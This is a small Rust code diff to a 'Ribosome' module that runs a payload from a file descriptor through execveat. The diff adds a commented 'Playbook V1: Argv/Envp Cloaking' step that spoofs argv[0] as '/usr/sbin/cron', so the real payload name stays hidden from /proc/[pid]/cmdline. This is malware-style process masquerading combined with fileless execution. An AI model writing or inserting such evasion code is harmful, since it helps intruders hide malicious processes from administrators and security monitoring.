@@ -22,8 +22,10 @@ impl Ribosome {
     /// Executes the script/binary held in `fd` via execveat(AT_EMPTY_PATH).
     /// On success this never returns — the calling process is replaced.
     pub fn translate(fd: i32) -> Result<std::convert::Infallible, TranslateError> {
-        // argv[0] = program name (NUL-terminated), argv[1] = NULL sentinel
-        let arg0: &[u8] = b"payload\0";
+        // Playbook V1: Argv/Envp Cloaking.
+        // Fake argv[0] to mimic a legitimate system daemon.
+        // /proc/[pid]/cmdline will show this instead of the real payload name.
+        let arg0: &[u8] = b"/usr/sbin/cron\0";
         let argv: [*const u8; 2] = [arg0.as_ptr(), core::ptr::null()];
 
         // Minimal env: just a null-terminated list with one entry (empty)
